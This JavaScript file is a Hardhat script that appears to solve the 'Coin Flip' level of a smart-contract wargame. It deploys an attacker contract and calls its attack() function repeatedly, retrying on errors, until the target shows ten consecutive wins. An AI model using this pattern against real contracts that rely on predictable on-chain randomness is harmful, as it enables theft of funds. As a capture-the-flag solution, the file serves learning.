const {BLOCK_EXPLORER_URL, COIN_FLIP_INSTANCE_ADDRESS} = require('./utils');

const MAX_SPLIT_COUNT = 10;

async function main() {
    console.log('\x1b[33m%s\x1b[0m', '* * * * * * * * * * * * * * * ');
	console.log('Coin Flip level');

    if (!COIN_FLIP_INSTANCE_ADDRESS) {
        console.log('Coin Flip instance address not found');
        return;
    }

    console.log('Coin Flip instance address', COIN_FLIP_INSTANCE_ADDRESS);

    const factory = await ethers.getContractFactory("CoinFlip");
    const contract = factory.attach(COIN_FLIP_INSTANCE_ADDRESS);

    const attackerFactory = await ethers.getContractFactory("CoinFlipAttacker");
    const attackerContract = await attackerFactory.deploy(contract.address);
    await attackerContract.deployed();

    await splitCoin(contract, attackerContract);

    console.log('\x1b[32m%s\x1b[0m', 'Coin Flip level. Done !!!');
    console.log('\x1b[33m%s\x1b[0m', '* * * * * * * * * * * * * * * ');
}

async function splitCoin(contract, attackerContract) {
    try {
        const consecutiveWins = await contract.consecutiveWins();
        const count = MAX_SPLIT_COUNT - consecutiveWins;
        console.log('need run attack count: ', count);
        let tx;

        for (let i = 1; i <= count; i++) {
            console.log(`Performing attack #${i}...`);
            tx = await attackerContract.attack();
            console.log(`Transaction hash : ${BLOCK_EXPLORER_URL}/${tx.hash}`);
            await tx.wait(1);
        }
    } catch (e) {
        console.log('Has a transaction error');
        console.log('Let me retry...');

        await splitCoin(contract, attackerContract);
    }
}

module.exports = main;
